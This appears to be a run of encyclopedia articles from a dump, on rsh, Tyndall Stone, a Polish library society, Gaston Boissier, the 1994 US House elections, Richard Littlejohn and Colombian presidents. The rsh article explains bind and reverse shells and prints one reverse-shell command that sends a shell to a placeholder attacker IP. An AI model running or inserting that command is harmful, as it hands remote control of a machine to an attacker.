The capital was taken by the Shogun&#x27;s forces, and Go-Toba&#x27;s rebellion was put to an end. Go-Toba was banished to the Oki Islands, from where he never returned. His sons were also banished, including Retired Emperor Tsuchimikado (to Tosa) and Retired Emperor Juntoku (to Sado), and the recently enthroned Emperor Chūkyō, the first son of Juntoku, was replaced with Emperor Go-Horikawa, a nephew of Go-Toba.

<doc id="1341483" wikidata="Q1314935" url="?curid=1341483" title="Remote Shell">
<text>The remote shell (rsh) is a command-line computer program that can execute shell commands as another user, and on another computer across a computer network.

The remote system to which &quot;rsh&quot; connects runs the &quot;rsh&quot; daemon (rshd). The daemon typically uses the well-known Transmission Control Protocol (TCP) port number 513.

==History==
&quot;Rsh&quot; originated as part of the BSD Unix operating system, along with rcp, as part of the rlogin package on 4.2BSD in 1983. rsh has since been ported to other operating systems. 

The codice_1 command has the same name as another common UNIX utility, the restricted shell, which first appeared in PWB/UNIX; in System V Release 4, the restricted shell is often located at codice_2.

As other Berkeley r-commands which involve user authentication, the rsh protocol is not secure for network use, because it sends unencrypted information over the network, among other reasons. Some implementations also authenticate by sending unencrypted passwords over the network. rsh has largely been replaced with the secure shell (ssh) program, even on local networks.

==Example==
As an example of rsh use, the following executes the command &quot;mkdir testdir&quot; as user &quot;remoteuser&quot; on the computer &quot;host.example.com&quot; running a UNIX-like system:
$ rsh -l remoteuser host.example.com &quot;mkdir testdir&quot;
After the command has finished rsh terminates. If no command is specified then rsh will log in on the remote system using rlogin. The network location of the remote computer is looked up using the Domain Name System.

== Installation ==
Command to install rsh client using apt

# apt-get install rsh-redone-client
== Bind shell and reverse shell ==

A remote shell session can be initiated by either a local device (which sends commands) or a remote device (on which commands are executed). In the first case remote shell will be called bind shell, in the second case - reverse shell.

Reverse shell can be used when the device on which the command is to be executed is not directly accessible - for example, for remote maintenance of computers located behind NAT that cannot be accessed from the outside. Some exploits create reverse shell from an attacked device back to machines controlled by the attackers (called &quot;reverse shell attack&quot;). The following code demonstrates a reverse shell attack:
$ exec 5&lt;&gt;/dev/tcp/&lt;attacker_IP&gt;/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done

It opens a TCP socket to attacker IP at port 80 as a file descriptor. It then repeatedly read lines from the socket and run the line, piping both stdout and stderr back to the socket. In other words, it gives the attacker a remote shell on the machine.

<text>Tyndall Stone is a registered trademark name by Gillis Quarries Ltd. Tyndall Stone is a dolomitic limestone that is quarried from the Selkirk Member of the Ordovician Red River Formation in the vicinity of Garson and Tyndall, Manitoba, Canada. It is a cream-coloured limestone with a pervasive mottling of darker dolomite. The mottling gives the rock a tapestry-like effect, and it is popular for use as a building and ornamental stone.

Tyndall Stone is highly fossiliferous and the fossils contribute to its aesthetic appeal. It contains numerous fossil gastropods, brachiopods, cephalopods, trilobites, corals, stromatoporoids, and others. The mottling results from burrowing by marine creatures that occurred during and shortly after limestone deposition. The identity of the burrowing organisms is not known, but fossil burrows of this type have been given the name &quot;Thalassinoides&quot;.

Tyndall Stone was first used in 1832 for building Lower Fort Garry, and has since become popular for building purposes throughout Canada and the United States. The Canadian Parliament Buildings in Ottawa, Ontario, the Saskatchewan Legislative Building in Regina, Saskatchewan, the University of Saskatchewan in Saskatoon, Saskatchewan, the Federal Public Building in Edmonton, Alberta, the Canadian Museum of History in Gatineau, Quebec, the Manitoba Legislative Building in Winnipeg, Manitoba, the Banff Springs Hotel, the Empress Hotel in Victoria, British Columbia, les Apartements Le Chateau in Montreal, Quebec and many others include Tyndall Stone in their construction.

The Tyndall Stone quarry is operated by Gillis Quarries Ltd. and is located approximately 40 kilometres northeast of Winnipeg, Manitoba. The quarry has been in operation, and owned by the same family, since 1910.

In 2023, Tyndall Stone was designated as a Global Heritage Stone Resource, the only one of Canadian origin.

<text>People&#x27;s Libraries Society (, &quot;T.C.L.&quot;) was an educational society established in 1880 for the Prussian partition of Poland (active in the regions of Greater Poland or the Grand Duchy of Poznan, Pomerania, West Prussia, Kashubia and Silesia). Its main goal was to promote education in Polish among the people, especially the lower classes, and to revert the Germanisation practices of the Prussian authorities. The society established a network of libraries, reading rooms and organized speeches. It was active till the outbreak of World War II in 1939, and it was dissolved in 1950.

==Famous members==
*Władysław Niegolewski (1819–1885) was a Polish liberal politician and member of parliament, insurgent in Greater Poland Uprising (1846), Greater Poland Uprising (1848) and January Uprising (1863), cofounder of the Central Economic Society (CTG) in 1861 and People&#x27;s Libraries Society (TCL) in 1880.

<doc id="1341496" wikidata="Q607202" url="?curid=1341496" title="Marie-Louis-Antoine-Gaston Boissier">
<text>Marie-Louis-Antoine-Gaston Boissier (15 August 1823 – 20 November 1908), French classical scholar, and secretary of the Académie française, was born at Nîmes.

The Roman monuments of his native town very early attracted Gaston Boissier to the study of ancient history. He made epigraphy his particular theme, and at the age of twenty-three became a professor of rhetoric at the University of Angoulême, where he lived and worked for ten years without further ambition. A travelling inspector of the university, however, happened to hear him lecture, and Boissier was called to Paris to be professor at the Lycée Charlemagne.

He began his literary career by a thesis on the poet Attius (1857) and a study on the life and work of Marcus Terentius Varro (1861). In 1861 he was made professor of Latin oratory at the Collège de France, and he became an active contributor to the &quot;Revue des deux mondes&quot;. In 1865 he published &quot;Cicéron et ses amis&quot; (Eng. trans. by AD Jones, 1897), which has enjoyed a success such as rarely falls to the lot of a work of erudition. In studying the manners of ancient Rome, Boissier had learned to re-create its society and to reproduce its characteristics with exquisite vivacity.

In 1874 he published &quot;La Religion romaine d&#x27;Auguste aux Antonins&quot; (2 vols.), in which he analysed the great religious movement of antiquity that preceded the acceptance of Christianity. In &quot;L&#x27;Opposition sous les Césars&quot; (1875) he drew a remarkable picture of the political decadence of Rome under the early successors of Augustus. By this time Boissier had drawn to himself the universal respect of scholars and men of letters, and on the death of HJG Patin, the author of &quot;Études sur les tragiques grecs&quot;, in 1876, he was elected a member of the Académie française, of which he was appointed perpetual secretary in 1895.

His later works include &quot;Promenades archéologiques: Rome et Pompei&quot; (1880; second series, 1886); &quot;L&#x27;Afrique romaine, promenades archéologiques&quot; (1901); &quot;La Fin du paganisme&quot; (2 vols, 1891); &quot;La Conjuration de Catilina&quot; (1905); &quot;Tacite&quot; (1903, Eng, trans. by WG Hutchison, 1906). He was a representative example of the French talent for lucidity and elegance applied with entire seriousness to weighty matters of literature. Though he devoted himself mainly to his great theme, the reconstruction of the elements of Roman society, he also wrote monographs on &quot;Madame de Sévigné&quot; (1887) and &quot;Saint-Simon&quot; (1892). He died in June 1908.

<text>Brigade 6 is an inactive Norwegian Infantry Brigade. Upon mobilization of the Norwegian Army, this Infantry Brigade was under the command of the 6th Division of the Norwegian Army.

The 6th Division was commissioned in 1933 to establish a field brigade with the same number as the division. 6th Brigade is often referred to as 6 fields brigade in literature on World War II.

In 2004, plans called for Brigade 6 to be a mobilisation brigade, using the equipment earmarked for training, maintenance, and repair (the second set of equipment) of Brigade North. Brigade 6 was not to be deployable overseas for international operations, but was planned to be capable of taking part in network-based multinational operations on Norwegian territory.

<text>The 1994 United States House of Representatives elections were held on November 8, 1994, to elect U.S. Representatives to serve in the 104th United States Congress. They occurred in the middle of President Bill Clinton&#x27;s first term. In what was known as the Republican Revolution, a 54-seat swing in membership from the Democratic Party to the Republican Party resulted in the latter gaining a majority of seats in the House of Representatives for the first time since 1952. It was also the largest seat gain for the party since 1946, and the largest for either party since 1948, and characterized a political realignment in American politics.

Democrats had run the House since 1955, and for all but four years (1947–49 and 1953–55) since 1931. In 1994, the Republican Party ran against President Clinton&#x27;s proposed healthcare reform. The Republicans argued that Clinton had abandoned the centrist New Democrat platform he campaigned on during the 1992 presidential election and reverted to big government solutions. The GOP ran on Newt Gingrich&#x27;s Contract with America.

The incumbent Speaker of the House, Democrat Tom Foley, lost re-election in his district, becoming the first sitting speaker to be defeated since Galusha Grow in 1863. Other major upsets included the defeat of powerful long-serving representatives such as Ways and Means chairman Dan Rostenkowski and Judiciary chairman Jack Brooks. In total, 34 incumbents, all Democrats, were defeated. Republicans also won a number of seats held by retiring Democrats. No Republican incumbents lost re-election, but Democrats won four open Republican-held seats. NFL Hall of Famer Steve Largent was elected in Oklahoma and singer Sonny Bono was elected in California.

Robert H. Michel, the Republican minority leader, chose to retire due to pressure from the more conservative members of the Republican caucus. Dick Cheney had served as the Minority Whip and Michel supported having Edward Rell Madigan replace him, but the position was instead given to Gingrich, who would later be selected to become speaker. The incumbent Democratic majority leader, Dick Gephardt, became minority leader. The new House leadership, under the Republicans, promised to bring a dozen legislative proposals to a vote in the first 100 days of the session, although the U.S. Senate did not always follow suit.

In a significant political realignment, the South underwent a dramatic transformation. Before the election, House Democrats outnumbered House Republicans in the South. Afterwards, with the Republicans having picked up a total of 19 Southern seats, they were able to outnumber Democrats in the South for the first time since Reconstruction. The Republicans would go on to remain the majority party of the House for the following 12 years, until the 2006 elections. The Republicans have won at least 200 seats in almost every House election since, with the exceptions of 2008 and 2018. , this is the last congressional election in which Democrats won a House seat in Montana, as well as the last time Republicans won any House seats in Massachusetts.

==Voting patterns==
===Republican gains, 1992–1994===
:Source: Data from exit-poll surveys by Voter Research and Surveys and Mitofsky International published in &quot;The New York Times&quot;, November 13, 1994, p. 24.

===Religious right===
Evangelicals were an important group within the electorate and a significant voting block in the Republican party. The national exit poll by Mitofsky International showed 27% of all voters identified themselves as a born-again or evangelical Christians, up from 18% in 1988 and 24% in 1992. Republican House candidates outpolled Democrats among white evangelicals by a massive 52 points, 76% to 24%.

According to a survey sponsored by the Christian Coalition, 33 percent of the 1994 voters were &quot;religious conservatives,&quot; up from 24 percent in 1992 and 18 percent in 1988 (&quot;CQ Weekly Report&quot;), November 19, 1994, p. 3364; in the 1994 exit poll, 38 percent identified themselves as &quot;conservatives,&quot; compared with 30 percent in 1992.

==Overall results==
Ross Perot&#x27;s organization United We Stand America issued a report card for each member of Congress. 169 Democrats, 2 Republicans, and one independent received a failing grade. Perot went on &quot;Larry King Live&quot; in October and called for the Democrats to lose their majority in the U.S. House. He endorsed the Republican opponent of Speaker Tom Foley.

<doc id="1341523" wikidata="Q7327405" url="?curid=1341523" title="Richard Littlejohn">
<text>Richard Littlejohn (born 18 January 1954) is an English author, broadcaster and opinion column writer, having started his career as a journalist. As of May 2023, he writes a twice-weekly column for the &quot;Daily Mail&quot; about British affairs.

Littlejohn has been a columnist for &quot;The Sun&quot;, but had written for &quot;The Spectator&quot; and the &quot;London Evening Standard&quot;. Littlejohn earned a place in the inaugural &quot;Press Gazette&quot; Newspaper Hall of Fame as one of the most influential journalists of the past 40 years. He was awarded the title of &quot;Columnist of the Year&quot; at the 1997 British Press Awards.

Littlejohn has been criticised for insufficient fact checking and for alleged homophobia. Primarily a newspaper journalist, he has also presented numerous radio and television shows and has authored or co-authored several books.

==Early life==
Littlejohn was born in Ilford, Essex in 1954. His family moved to Peterborough when he was five. His father worked as a policeman and later as a manager for British Rail. Littlejohn attended West Town Primary School where he passed the eleven-plus, obtaining the highest marks in his year. He was offered a public school scholarship which he turned down because the school did not play football, and subsequently attended Deacon&#x27;s School in Dogsthorpe, Peterborough.

At Deacon&#x27;s School he appeared, when 13, as part of a team of four boys in &quot;Top of the Form&quot; against Kings Norton Grammar School for Girls, broadcast on Sunday 22 October 1967 on the new BBC Radio 2, which was recorded on Tuesday 19 September 1967. In his team were Michael Conning, Martin Bradshaw of Walton, and the captain Martin Chambers. It was recorded in the school hall with John Ellison; and Tim Gudgin from Kings Norton.

==Journalism==
At 16, Littlejohn found employment as a trainee journalist in Peterborough. He worked for local newspapers during the early 1970s. In the mid-1970s, he joined the Birmingham &quot;Evening Mail&quot; as an industrial correspondent.

He worked at the London newspaper the &quot;Evening Standard&quot; from 1979 to 1989, initially as industrial editor, later a feature writer, then in 1988 as a columnist. While industrial editor in the early 1980s he was asked to stand as a Labour Party candidate, which he declined. In 1989, he joined &quot;The Sun&quot; as a columnist, which attracted controversy, and he was voted &quot;Irritant of the Year&quot; at the 1992 &quot;What The Papers Say Awards&quot;.

In March 1993 he gave his support to the &quot;Save the &quot;New Statesman&quot; fund&quot; to raise cash to contest libel suits served on the magazine by the then Prime Minister John Major and caterer Claire Latimer.

In 1994, he left &quot;The Sun&quot; to write for the &quot;Daily Mail&quot;, contributing columns on news and current affairs (in a similar format to his &quot;Sun&quot; column), and one on sport. His &quot;Mail&quot; columns earned him the title &quot;Columnist of the Year&quot; at the 1997 British Press Awards.

In February 1998, Littlejohn became the UK&#x27;s best-paid columnist when he returned to &quot;The Sun&quot; to write a twice-weekly column as part of a £1million deal, which also included presenting for BSkyB.

In addition to regular columns, Littlejohn has contributed articles to &quot;The Spectator&quot; and &quot;Punch&quot;.

One of Littlejohn&#x27;s &quot;Sun&quot; columns – a 2004 skit, entitled &quot;Rum, Sodomy and the Lifejacket&quot;, in which Lord Nelson is confronted with political correctness, compensation culture and the nanny state – had been published in newspapers, magazines, and websites with Littlejohn&#x27;s writing credit removed.

In 2004, the &quot;Diary&quot; column of &quot;The Guardian&quot; newspaper documented the results of a &quot;Littlejohn audit&quot;—a count of the number of references Littlejohn makes to homosexuality in his columns. Marina Hyde of &quot;The Guardian&quot; wrote in 2004:

In May 2005, the &quot;Mail&quot; announced that he was rejoining the paper in a move that &quot;Mail&quot; editor Paul Dacre described as &quot;returning to his spiritual home&quot;. &quot;The Sun&quot; sought an injunction to prevent Littlejohn writing for the &quot;Mail&quot; before his existing contract with them ended in February 2006, but the matter was later settled out of court and Littlejohn began writing for the &quot;Mail&quot; in December 2005.

In December 2010, Littlejohn satirised an incident in which a 20-year-old man with cerebral palsy, Jody McIntyre, complained of mistreatment by police at a protest. Littlejohn argued that the young man involved should not have attended the protest, and compared him to Andy Pipkin from &quot;Little Britain&quot;. This prompted 500 complaints to the Press Complaints Commission.

In December 2012, the &quot;Daily Mail&quot; published an apology following a piece written by Littlejohn which suggested that ethnic minority staff had got their jobs through discrimination and had threatened to sue the Equality and Human Rights Commissions. The &quot;Daily Mail&quot; agreed with the Press Complaints Council to publish an apology and clarification.

===Asian hopscotch lessons===
In February 2011, Littlejohn wrote in his &quot;Daily Mail&quot; column that Haringey Council was using taxpayer funds for hopscotch lessons for Asian women. This was an urban myth first propagated in 1995 by the former Conservative Party chairman Brian Mawhinney, who took the name of the Hopscotch Asian Women&#x27;s Centre literally. The centre offers &quot;support services for Asian women and their families on a wide range of issues including domestic violence, benefits, housing, education, immigration and health matters [and provided] advocacy and support to people with learning disabilities&quot;.

===Lucy Meadows===
In December 2012, Littlejohn wrote an article criticising the decision of Accrington teacher Lucy Meadows to return to the same school after undergoing Gender Reassignment Surgery. Littlejohn repeatedly misgendered Meadows and stated: &quot;he&#x27;s not only trapped in the wrong body, he&#x27;s in the wrong job&quot;.

In March 2013, Meadows was found dead with police reporting no suspicious circumstance, suggesting suicide. Littlejohn&#x27;s article was later removed from the &quot;Daily Mail&quot;″s website following Meadows&#x27; death. Trans Media Watch, a charity for transgender people, said: &quot;We are deeply saddened that this inquest should ever have been needed.&quot; A petition drive was launched demanding Littlejohn be sacked. Two petitions signed by over 240,000 people were handed over to the &quot;Daily Mail&quot; offices.

At the inquest into her death on 28 May 2013, it was reported Meadows had contacted the Press Complaints Commission (PCC) over press harassment citing Littlejohn. Blackburn and Hyndburn Coroner Michael Singleton stated that press coverage of her gender reassignment was &quot;ill informed bigotry&quot; and that Littlejohn in his article had &quot;carried out what can only be described as a character assassination, having sought to ridicule and humiliate Lucy Meadows and bring into question her right to pursue her career as a teacher&quot;.

===Jack Monroe===
In 2013, Littlejohn was accused of taking insufficient care to check the facts before publishing an article critical of cookery writer and poverty campaigner Jack Monroe. Littlejohn suggested that Monroe chose to give up her job. Monroe&#x27;s young son was unsettled with a range of different carers. As Monroe had grown up in a home with foster children, she is aware of the potential for harming him. Monroe tried unsuccessfully to negotiate flexible hours so she could work and look after her baby, but gave up her job so she could look after the child better. Littlejohn incorrectly suggested that Monroe was an unemployed welfare claimant.

===Tom Daley===
On 15 February 2018, Littlejohn, writing for his &quot;Daily Mail&quot; column, focused on the news that Tom Daley and his husband Dustin Lance Black were expecting their first child. Littlejohn stated that while he supported fostered children being brought up by loving, gay partners, as opposed to living in state institutions, he nonetheless adhered to his belief that children &quot;benefit most from being raised by a man and a woman&quot;. He also criticised that in many cases of male gay relationships, Daley and Black included, women were being seen as &quot;mere breeding machines&quot; (their baby&#x27;s surrogate mother not having been identified) and that offspring were shown off like &quot;commodities&quot;.

Littlejohn was accused by &quot;PinkNews&quot; of homophobia. As a result, Center Parcs announced its decision to cease publication of its advertisements in the &quot;Daily Mail&quot;, with a number of other businesses also reviewing their decision to advertise in the newspaper.

===Radio===
By the end of the 1980s, Littlejohn was known in London for his &quot;Evening Standard&quot; columns, and was invited on to radio programmes as a pundit. From 1991, he worked for the London radio station LBC, beginning with a regular opinion spot. LBC later gave Littlejohn an early afternoon show, &quot;Littlejohn&#x27;s Long Lunch&quot;; the programme was a talk show featuring topical discussion, phone-ins, and guests. He later became permanent presenter of the morning show, replacing Michael Parkinson.

During his time at LBC, Littlejohn was censured by the Radio Authority for breaching broadcasting rules. This culminated in the Radio Authority stating that he &quot;had broken half-a-dozen rules and had incited violence&quot; due to an edition of his phone-in show in which he suggested the police should have used flamethrowers against a group of &quot;militant homosexuals&quot; protesting outside the House of Commons.

On another LBC phone-in he was censured by the Radio Authority for describing the Royal Family as a &quot;bunch of tax-evading adulterers&quot;.

He also deputised for Jimmy Young on BBC Radio 2 and hosted football phone-ins on BBC Radio 5 Live.

===Television===
After leaving LBC in 1994, Littlejohn was approached by BSkyB managing director (and former &quot;Sun&quot; editor) Kelvin MacKenzie, and was offered the chance to present a nightly current affairs show on the TV channel Sky News. Called &quot;Richard Littlejohn&quot;, the show ran for one year, but was not a success. Littlejohn expressed his disappointment, stating that broadcasting regulations would not permit him to present the show in the style of Rush Limbaugh&#x27;s programmes: &quot;If Sky News could emulate its US sister Fox News... ratings would soon shoot past the Astra satellite. But the regulators won&#x27;t allow it.&quot;

Later in 1994, Trevor Phillips of London Weekend Television hired Littlejohn to host a studio-based talk show entitled &quot;Richard Littlejohn Live And Uncut&quot;. Phillips produced three series of the programme, which was transmitted only in the London area.

On Littlejohn&#x27;s show of 8 July 1994, he was critical of two lesbians, one of whom was Linda Bellos. The film director Michael Winner, a guest on the show, criticised Littlejohn for his views.

Littlejohn hosted the first series of Channel 4&#x27;s game show &quot;Wanted&quot;, as a stand-in for Bob Mills. &quot;Wanted&quot; aired in October 1996 and won a Silver Rose at the Festival Rose d&#x27;Or. As part of a 1997 deal, which saw him return to &quot;The Sun&quot;, Littlejohn hosted a nightly talk show on Sky One called &quot;Littlejohn: Live And Unleashed&quot;.

In early 2003, he returned to Sky News to present &quot;Littlejohn&quot;, a live talk show initially broadcast twice weekly but later extended to four nights per week. The programme was dropped on 8 July 2004 when Sky News changed format and replaced it with regular rolling news.

On 9 July 2007, Channel 4 showed a documentary entitled &quot;The War on Britain&#x27;s Jews?&quot;, written and narrated by Littlejohn. Littlejohn has also appeared on BBC One&#x27;s &quot;Question Time&quot; and &quot;Have I Got News for You&quot;.

===Books===
Littlejohn has authored or co-authored:

* &quot;The Essex Girl Joke Book&quot; (1991, Corgi Publishing) – a collection of Essex girl jokes, co-written (with &quot;Brent Wood&quot; {Mitchell Symons}) under the pseudonym &quot;Ray Leigh&quot;.
* &quot;You Couldn&#x27;t Make It Up&quot; (1995, Heinemann, ) – named after one of Littlejohn&#x27;s catchphrases, and described on the jacket as &quot;a brilliant collection of liberal-skewering wit and wisdom&quot;, this is a book of recollections and opinion pieces on subjects such as political correctness, politicians, corporate &quot;fat cats&quot;, the European Union, and the British Royal Family. Anthony Daniels, writing in &quot;The Daily Telegraph&quot;, said: &quot;...not only does he never mention foreigners in any but a derogatory way – when he is far too intelligent a man really to believe that we have nothing to learn from any of them – but when he writes of the Germans and the Japanese as having taken our cars and electronics industries he is pandering to the kind of stupid, ignorant, sentimental, self-pitying xenophobia which is the root of all fascism, and which is an obstacle to genuine self improvement.&quot; The &quot;New Statesman&quot; wrote: &quot;Not exactly &quot;New Statesman&quot; territory, but the pick of the best tabloid columnist in Britain is a joy from beginning to end. Hysterically funny, wonderfully politically incorrect, [...] the only writer in Britain to rival the best of the Americans.&quot;
* &quot;To Hell in a Handcart&quot; (2001, HarperCollins, ) – named after another of his catchphrases, this is Littlejohn&#x27;s only novel, based loosely on the Tony Martin case. The book was lambasted by critics for its portrayal of asylum seekers and the stereotypical individuals in the book, notably by &quot;The Independent&quot;&#x27;s David Aaronovitch who described it as &quot;a 400-page recruiting pamphlet for the British National Party&quot;. However, it received positive reviews from some conservative writers such as Frederick Forsyth and Andrew Roberts. This was later the subject of a BBC Radio Five Live discussion with Will Self.
* &quot;The Book of Useless Information&quot; (with Keith Waterhouse, 2002, John Blake Publishing, ) – co-written with Keith Waterhouse, this &quot;stocking filler&quot; book is a collection of &quot;useless&quot; facts, described on the cover as &quot;all you never needed to know and didn&#x27;t need to ask&quot;.
* &quot;The Ultimate Book of Useless Information&quot; (with Keith Waterhouse, 2004, John Blake Publishing, ) – another volume of &quot;useless&quot; facts.
* &quot;Littlejohn&#x27;s Britain&quot; – Publisher: Hutchinson (3 May 2007) – described by &quot;The Observer&quot; as &quot;lampooning New Labour with polemic, pastiche, parody, satire and savage social commentary&quot;. The &quot;New Statesman&quot; said of it: &quot;Littlejohn&#x27;s Britain doesn&#x27;t exist. Literally. He spends much of the year writing from a gated mansion in Florida, and admitted in a recent column that, when he is in Britain, he rarely leaves the house. He is describing a country he sees only through the pages of the right-wing press and his self-reinforcing mailbag.&quot;
*&quot;Littlejohn&#x27;s House of Fun: Thirteen Years of (Labour) Madness&quot; – Publisher: Hutchinson (1 April 2010) – Reviewing for &quot;The Daily Telegraph&quot; Roger Lewis said: &quot;If you prize free expression, this book is essential reading. I was unable to find fault with a single sentiment.&quot;
*&quot;Littlejohn&#x27;s Lost World&quot; – Publisher:Arrow Books (2014) – a volume of autobiography covering the author&#x27;s first sixteen years.

==Personal life==
Littlejohn is a keen football fan and since the late 1960s has been a supporter of Tottenham Hotspur. He has starred in his own football video, &quot;We Woz Robbed&quot;.

He married Wendy A. Bosworth in 1974. They have two children: Georgina (born in 1975), also a journalist, and William (born in 1979), a chef.

<doc id="1341524" wikidata="Q356957" url="?curid=1341524" title="Julio César Turbay Ayala">
<text>Julio César Turbay Ayala (18 June 1916 – 13 September 2005) was a Colombian lawyer and politician who served as the 25th President of Colombia from 1978 to 1982. He also held the positions of Foreign Minister and Ambassador to the United States.

== Biographic data ==
Turbay was born in a rich neighborhood of &quot;“Voto Nacional”&quot;, Bogotá, on June 18, 1916. His father, Antonio Amín Turbay, was a businessman who emigrated from Tannourine, Lebanon.
His mother, Rosaura Ayala, was a peasant from the province of Cundinamarca. Turbay&#x27;s father, a hard working merchant, had built a fortune, which he completely lost during the Thousand Days War. Turbay Ayala completed his secondary studies in Bogotá, but never attended college, and instead became an autodidact, a fact that his political adversaries always poked fun at. He received a number of honorary degrees later in life.

== Political career ==
Turbay started his political career in the Liberal Party as a councilman in the (then) town of Usme in 1936. He would later be appointed as major of the city of Girardot (1937), and then councilman in the town of Engativá in 1938 along with fellow politicians Alfonso López Michelsen and Álvaro Gómez Hurtado. The next few years he spent as a member of the Assembly of Cundinamarca. In 1943 he was chosen for congress as a Chamber Representative. He was a leader of the opposition to conservative governments, and in 1953 became a member of the national directive of the liberal party. With the rise to power of the military Junta that ousted dictator Gustavo Rojas Pinilla, Turbay was appointed Minister of Mines and Petroleum. He was later appointed Minister of Foreign Affairs by president Alberto Lleras Camargo until 1961. He was known as a strong defender of the National Front, and was chosen as senator for four consecutive periods between 1962 and 1974. He also served briefly as interim president in 1967. He was also appointed as ambassador the UN (1967-1969), United Kingdom (1973-1974), and the United States (1975-1976). He first attempted to become a presidential candidate in 1974, but ended up supporting López Michelsen, who won the elections that year. The sector supporting López Michelsen was instrumental in Turbay&#x27;s presidential campaign of 1978, and after a very narrow election he became president of Colombia in 1978.

==Presidency==

===1978 Security Statute===

In response to an increase in guerrilla activity from the 19th of April Movement (M-19) and the Revolutionary Armed Forces of Colombia, as well as to the Colombian Communist Party&#x27;s attempts to extend its political influence and a 1977 national strike, a 1978 decree, known as the Security Statute, was implemented by Turbay&#x27;s administration.

Militants, unionists, social and university leaders, as well as intellectuals were considered opposed to the policies of the “Turbayista” government and were seen as enemies of the nation and its interests. It was a time of clear abuses of authority, disappearances, torture and other types of punishment against those considered to be opponents.

The Security Statute gave the military an increased degree of freedom of action, especially in urban areas, to detain, interrogate and eventually judge suspected guerrillas or their collaborators before military tribunals. Human rights organizations, newspaper columnists, political personalities and opposition groups complained about an increase in the number of arbitrary detentions and acts of torture as a result.

Although the Security Statute allegedly benefited some of the counterinsurgency operations of the security forces, such as the capture of most of the M-19&#x27;s command structure and many of the guerrilla group&#x27;s urban cells, the measure became highly unpopular inside and outside Colombia, promoting some measure of public sympathy for the victims of the real or perceived military abuses whether they were guerrillas or not, and was phased out towards the end of the Turbay administration.

=== External relations ===
In terms of foreign policy, the country moved to the right, showing itself to be an ally of the United States, first with President Jimmy Carter, and then with his successor, Ronald Reagan. Turbay aligned the country with Ronald Reagan&#x27;s conservative policies, which caused him problems with neighbouring American nations.

Turbay also became involved with the UK, supporting the British cause during the Falklands War, a position that isolated the country from other Latin American nations. The controversy did not stop there, as under Turbay&#x27;s administration, Colombia severed diplomatic relations with Cuba.

===1980 Dominican embassy crisis===
The M-19&#x27;s late 1980 takeover of the Dominican Republic&#x27;s embassy, during which sixteen ambassadors were held hostage for 61 days, presented a complicated challenge to the Turbay administration.

The incident soon spread throughout worldwide headlines, as ambassadors from the United States of America, Costa Rica, Mexico, Peru, Israel and Venezuela had been taken hostage, as well as Colombia&#x27;s top representative to the Holy See.

Turbay, despite pressure from military and political sectors, avoided deciding to solve the crisis through the use of direct military force, and instead eventually agreed to let the M-19 rebels travel to Cuba. Allegedly, the rebels also received USD 1 million as payment, instead of the initial $50 million that they had originally demanded from the government.

That a mostly peaceful resolution to the crisis was found has been generally considered as a positive aspect of Turbay&#x27;s administration, as seen by later and contemporary commentators and historians.

In particular, former M-19 members, including Rosemberg Pabón, the commander of the guerrilla group&#x27;s operative unit at the time, later recognized and respected Turbay&#x27;s handling of the situation.

==Post-presidency==

Turbay was a supporter of president Álvaro Uribe. He initially opposed the possibility of presidential reelection in Colombia, but later changed his views, contributing to founding a movement known as &quot;Patria Nueva&quot; (&quot;New Homeland&quot;), in order to help promote Uribe&#x27;s 2006 reelection aspirations.

=== Support for a prisoner exchange with the FARC ===

Turbay was seen as being at odds with some of Uribe&#x27;s policies, however, in particular due to Turbay&#x27;s activism in favor of the implementation and negotiation of a prisoner exchange with the FARC guerrilla group. As part of this effort, Turbay participated in several meetings with the relatives of FARC hostages and signed several declarations of support, together with other former presidents such as Alfonso López Michelsen and Ernesto Samper Pizano.

On August 31, 2005, Turbay proposed that the government could exchange each jailed guerrilla for 10 &quot;economic&quot; hostages (those held for extortion purposes) and one &quot;political&quot; hostage (those held by the FARC in order to pressure the Colombian government to release its jailed members).

== Personal life ==

Turbay married his niece, Nydia Quintero Turbay, on July 1, 1948. They had four children together: Julio César, Diana, Claudia, and María Victoria. However, their marriage was annulled by the Roman Catholic Church, and in 1986, he married his longtime companion Amparo Canal, to whom he remained married until his death. He is related to Paola Turbay.

In January 1991, Turbay&#x27;s daughter, the journalist Diana Turbay, was kidnapped by orders of the Medellín Cartel and died during a failed police rescue operation not sanctioned by her family. Her kidnapping is chronicled in &quot;News of a Kidnapping&quot; by the Nobel Prize-winning author Gabriel García Márquez (1996) and depicted in multiple onscreen productions.

A personal idiosyncrasy of Turbay&#x27;s was his custom of wearing bow ties, a sartorial habit extremely uncommon in Colombia.

== Death ==
Turbay died on 13 September 2005, at the age of 89. He was honored by a state funeral personally led by President Álvaro Uribe and was buried at the Sacromonte Caves at Canton Norte, an army base in Bogotá.. He visited Lebanon with his family in 2003 as a final trip to the homeland of his family.

== Controversy ==
In recent times, it was revealed that Turbay was the most prominent name included in Jimmy Carter’s Colombia Blacklist, which comprised corrupt politicians and officers profiting from the drug trade.

<text>Alfonso López Michelsen (30 June 1913 – 11 July 2007) was a Colombian politician and lawyer who served as the 24th President of Colombia from 1974 to 1978. He was nicknamed &quot;El Pollo&quot; (The Chicken), a popular Colombian idiom for people with precocious careers.

==Early years==

López was the son of former two-time president of Colombia, Alfonso López Pumarejo and his first wife María Michelsen Lombana, who was of Danish descent. He was born and raised in Bogotá. He studied at the &quot;Gimnasio Moderno&quot; School and later in other cities: Paris, Brussels, London and Santiago de Chile. He graduated with a degree in law from the Universidad del Rosario.

During his father&#x27;s presidency, López maintained a low profile in politics and instead focused on becoming a university professor at the &quot;Universidad del Rosario&quot;.

In 1938, López married Cecilia Caballero Blanco in Bogotá and they had three sons. They moved to the outskirts of Bogotá in a &quot;hacienda&quot; in the then municipality of Engativá, Cundinamarca Department (nowadays a Locality of Bogotá). Settled in this town, López had his first experience of politics becoming a town councilman. During this time, his fellow councilmen included two other politicians who went on to become key political players in the country, Álvaro Gómez Hurtado and future president Julio César Turbay Ayala.

==Political career==

In 1959, a group of his former college students founded the Liberal Revolutionary Movement (MRL) as a reaction against the pact between the Liberal Party and the Conservative Party to create the National Front, in which the two parties took turns to govern. López Michelsen was then offered the leadership of the newly created MRL and he accepted, becoming a presidential candidate for the 1962 presidential elections. López lost the election by a large margin to Conservative candidate Guillermo León Valencia.

===Governor of the Department of Cesar (1967–1968)===

